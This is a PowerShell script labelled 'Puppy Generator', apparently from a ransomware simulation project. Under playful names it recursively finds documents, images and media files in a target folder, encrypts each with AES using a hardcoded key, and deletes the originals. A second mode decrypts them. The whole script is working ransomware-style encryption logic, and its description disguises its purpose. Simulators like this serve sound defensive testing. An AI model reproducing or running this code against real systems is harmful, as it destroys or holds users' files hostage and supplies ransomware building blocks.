 <#

.SYNOPSIS
    Puppy Generator

.DESCRIPTION
    This script is intended to generate puppies


.PARAMETER Target File Path
    Target for your puppies
 
.PARAMETER File Extension
    What file extensions should your puppies have

.PARAMETER Puppifyion key
    Name for your pupies 
#>

# Define parameters and their defaults
param([string]$Mode,
      [string]$LastName = ".retest",
      [string]$TargetPath = "C:\Users\PhillipWahlstrøm\Desktop\Ransim\RanSim-main\RanSim-main",
      [string]$Callsign = "QRkpt21jo2Lu6wn82hlY9k8xUj5KyUrJOPIC9da41jg="
)

$PuppyBreeds = '*.pdf','*.xls*','*.ppt*','*.doc*','*.accd*','*.rtf','*.txt','*.csv','*.jpg','*.jpeg','*.png','*.gif','*.avi','*.midi','*.mov','*.mp3','*.mp4','*.mpeg','*.mpeg2','*.mpeg3','*.mpg','*.ogg'

ipmo ".\FileCryptography.psm1"

if ($mode -eq "puppify") {
    # Gather all files from the target path and its subdirectories
    $FilesToPuppify = get-childitem -Include $PuppyBreeds -Recurse -force -path $TargetPath\*  -Exclude *$LastName  | where { ! $_.PSIsContainer }
    $NumPuppies = $FilesToPuppify.length

    # Puppify the files
    foreach ($puppy in $FilesToPuppify)
    {
        Write-Host "Puppifying $puppy"
        Protect-File $puppy -KeyAsPlainText $Callsign -Suffix $LastName -Algorithm AES -RemoveSource
    }
    Write-Host "Puppifyed $NumPuppies" | Start-Sleep -Seconds 10
}

elseif ($mode -eq "depuppify") {
    # Gather all files from the target path and its subdirectories
    $FilestoDepuppify = get-childitem -path $TargetPath\* -Include *$LastName -Recurse -force | where { ! $_.PSIsContainer }

    # Puppify the files
    foreach ($puppy in $FilestoDepuppify)
    {
        Write-Host "Depuppyfing $puppy"
        Unprotect-File $puppy -KeyAsPlainText $Callsign -Suffix $LastName -Algorithm AES   -RemoveSource
    }
} 

else {
    write-host "you must puppify or depuppify"
}
exit 
